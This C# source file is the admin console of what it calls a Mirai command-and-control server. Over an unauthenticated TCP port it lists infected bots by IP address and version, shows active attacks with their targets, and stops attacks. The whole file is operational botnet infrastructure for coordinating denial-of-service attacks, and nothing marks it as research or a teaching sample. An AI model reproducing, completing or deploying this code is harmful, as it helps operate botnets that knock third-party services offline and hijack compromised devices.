using System;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using Serilog;

namespace MiraiCnCServer
{
  public class AdminServer
  {
    private readonly BotManager botManager;
    private readonly AttackCoordinator attackCoordinator;
    private readonly int port;
    private TcpListener? listener;

    public AdminServer(BotManager bm, AttackCoordinator ac, int p)
    {
      botManager = bm;
      attackCoordinator = ac;
      port = p;
    }

    public async Task StartAsync()
    {
      listener = new TcpListener(IPAddress.Any, port);
      listener.Start();

      Log.Information($"[Admin] Admin interface started on port {port}");

      while (true)
      {
        try
        {
          var client = await listener.AcceptTcpClientAsync();
          _ = Task.Run(() => HandleAdminConnection(client));
        }
        catch (Exception ex)
        {
          Log.Error(ex, "[Admin] Error accepting admin connection");
        }
      }
    }

    private async Task HandleAdminConnection(TcpClient client)
    {
      try
      {
        var stream = client.GetStream();
        var endpoint = (IPEndPoint)client.Client.RemoteEndPoint!;

        Log.Information($"[Admin] Admin connected from {endpoint.Address}");

        await SendLine(stream, "Welcome to Mirai C&C Server");
        await SendLine(stream, "Commands: bots, attacks, stop, exit");
        await SendLine(stream, "> ");

        var buffer = new byte[1024];
        while (true)
        {
          int read = await stream.ReadAsync(buffer, 0, buffer.Length);
          if (read == 0) break;

          var command = Encoding.ASCII.GetString(buffer, 0, read).Trim();

          if (string.IsNullOrEmpty(command))
            continue;

          Log.Debug($"[Admin] Command from {endpoint.Address}: {command}");

          var response = command.ToLower() switch
          {
            "bots" => HandleBotsCommand(),
            "attacks" => HandleAttacksCommand(),
            "stop" => HandleStopCommand(),
            "exit" or "quit" => null,
            _ => "Unknown command\n"
          };

          if (response == null)
            break;

          await SendLine(stream, response);
          await SendLine(stream, "> ");
        }
      }
      catch (Exception ex)
      {
        Log.Debug(ex, "[Admin] Admin connection error");
      }
      finally
      {
        client?.Close();
      }
    }

    private async Task SendLine(NetworkStream stream, string text)
    {
      var data = Encoding.ASCII.GetBytes(text);
      await stream.WriteAsync(data, 0, data.Length);
    }

    private string HandleBotsCommand()
    {
      var bots = botManager.GetAllBots();
      var sb = new StringBuilder();

      sb.AppendLine($"\nActive Bots: {bots.Count}");
      sb.AppendLine("─────────────────────────────────────");

      foreach (var bot in bots)
      {
        var uptime = (DateTime.UtcNow - bot.ConnectedAt).TotalMinutes;
        sb.AppendLine($"• {bot.IpAddress,-15} v{bot.Version} ({uptime:F1}m)");
      }

      return sb.ToString();
    }

    private string HandleAttacksCommand()
    {
      var attacks = attackCoordinator.GetActiveAttacks();
      var sb = new StringBuilder();

      sb.AppendLine($"\nActive Attacks: {attacks.Count}");
      sb.AppendLine("─────────────────────────────────────");

      foreach (var attack in attacks)
      {
        sb.AppendLine($"• #{attack.Id} {attack.Name} ({attack.Type})");
        sb.AppendLine($"  Targets: {string.Join(", ", attack.Targets)}");
        sb.AppendLine($"  Remaining: {attack.SecondsRemaining}s / {attack.Duration}s");
      }

      return sb.ToString();
    }

    private string HandleStopCommand()
    {
      attackCoordinator.StopAllAttacks();
      _ = botManager.KillAllAttacksAsync();
      return "All attacks stopped\n";
    }
  }
}
